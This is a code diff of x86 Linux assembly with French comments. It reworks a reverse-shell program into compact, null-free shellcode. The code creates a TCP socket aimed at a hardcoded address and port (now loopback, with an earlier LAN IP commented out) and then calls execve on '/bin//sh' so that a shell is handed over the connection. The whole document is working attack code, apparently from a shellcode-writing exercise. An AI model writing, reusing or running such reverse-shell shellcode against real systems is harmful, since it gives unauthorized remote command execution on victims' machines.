@@ -13,29 +13,25 @@ section .data
 section .text
     global _start
 _start:
-    ;clean des registres
-    xor eax, eax
-    xor ebx,ebx
-    xor ecx,ecx
-    xor esi,esi
-    xor edi,edi
 
 
-    ;create_socket
-    mov al,102 ; voir syscall -> Socketcall
-    mov bl,1 ; voir net.h -> SYS_SOCKET
-    push 0 ; IPPROTO_IP -> Protocole
-    push 1 ; SOCK_STREAM -> Créé flux TCP
-    push 2 ; AF_INET -> IPv4
-    mov ecx,esp ; on récupère le pointeur pour le mettre dans ecx
+    push 0x66 
+    pop eax
+    push 0x1 
+    pop ebx
+    xor ecx,ecx 
+    push ecx
+    push 1 
+    push 2
+    mov ecx,esp 
+    int 0x80
 
-    int 80h
 
     mov edi,eax ; on récupère le file descriptor = ID du socket
     
     ;create_addr_struct - Le "word" permet de pas décaler et de pas sortir de la structure
-    ;push 0x0101017f ; ip loopback(127.0.0.1) si besoin
-    push 0x1D01A8C0 ; my ip 192.168.1.29
+    push 0x0101017f ; ip loopback(127.0.0.1) si besoin
+    ;push 0x1D01A8C0 ; my ip 192.168.1.29
     push word 0xD204 ; port 1234
     push word 2 ; AF-INET -> IPv4
     mov ecx,esp ;  on récupère le pointeur pour le mettre dans ecx
@@ -69,24 +65,28 @@ _start:
     inc ecx
     int 80h
     
-    ; ;;; Garantie un shell mais renvoie sur un shell pas beau
+    ;;; Garantie un shell mais renvoie sur un shell pas beau
 
-    ; ;execve ("/bin/bash",NULL,NULL) (voir syscall)
-    ; mov al,11
-    ; mov ebx, bash ; on met le bash de la section .data dans ebx
-    ; xor ecx, ecx
+    ;execve ("/bin/bash",NULL,NULL) (voir syscall)
+    mov al,11
+    xor ebx,ebx 
+    push ebx
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    xor ecx, ecx
 
-    ; int 80h
+    int 80h
 
     ;;; Executable sur une machine uniquement équipée de python, mais renvoie un shell fortement utilisable
 
-    mov al,11
-    mov ebx, python ; on met le bash de la section .data dans ebx
-    push 0
-    push bash_arg
-    push command
-    push ebx
-    mov ecx, esp
+    ; mov al,11
+    ; mov ebx, python ; on met le bash de la section .data dans ebx
+    ; push 0
+    ; push bash_arg
+    ; push command
+    ; push ebx
+    ; mov ecx, esp
 
 
     int 80h
@@ -95,8 +95,8 @@ _start:
     jmp _exit
 
 _exit:
-    mov eax, 1
-    mov ebx, 0
+    mov al, 1
+    mov bl, 0
     int 80h
 
   
